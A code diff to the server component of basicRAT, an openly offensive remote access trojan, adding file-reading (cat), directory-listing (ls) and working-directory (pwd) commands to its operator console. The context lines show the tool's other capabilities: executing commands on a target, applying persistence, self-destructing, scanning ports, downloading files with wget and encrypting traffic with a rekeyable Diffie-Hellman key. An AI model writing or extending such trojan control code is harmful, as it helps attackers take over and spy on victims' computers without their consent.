@@ -26,17 +26,20 @@ BANNER = '''
 |_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
          https://github.com/vesche/basicRAT
 '''
-COMMANDS = [ 'client', 'clients', 'execute', 'goodbye', 'help', 'kill',
-             'persistence', 'quit', 'rekey', 'scan', 'selfdestruct', 'survey',
-             'unzip', 'wget' ]
+COMMANDS = [ 'cat', 'client', 'clients', 'execute', 'goodbye', 'help', 'kill',
+             'ls', 'persistence', 'pwd', 'quit', 'rekey', 'scan', 'selfdestruct',
+             'survey', 'unzip', 'wget' ]
 HELP_TEXT = '''
+cat <file>          - Output a file to the screen.
 client <id>         - Connect to a client.
 clients             - List connected clients.
 execute <command>   - Execute a command on the target.
 goodbye             - Exit the server and keep all client connections alive.
 help                - Show this help menu.
 kill                - Kill the client connection.
+ls                  - List files in the current directory.
 persistence         - Apply persistence mechanism.
+pwd                 - Get the present working directory.
 quit                - Exit the server and destroy all client connections.
 rekey               - Regenerate crypto key.
 scan <ip>           - Scan top 25 TCP ports on a single host.
@@ -135,8 +138,8 @@ class ClientConnection():
             self.dhkey = diffiehellman(self.conn)
 
         # results of execute, persistence, scan, survey, unzip, or wget
-        if cmd in [ 'execute', 'persistence', 'rekey', 'scan', 'survey',
-                    'unzip', 'wget' ]:
+        if cmd in [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'rekey',
+                    'scan', 'survey', 'unzip', 'wget' ]:
             print 'Running {}...'.format(cmd)
             recv_data = decrypt(self.conn.recv(4096), self.dhkey)
             print recv_data
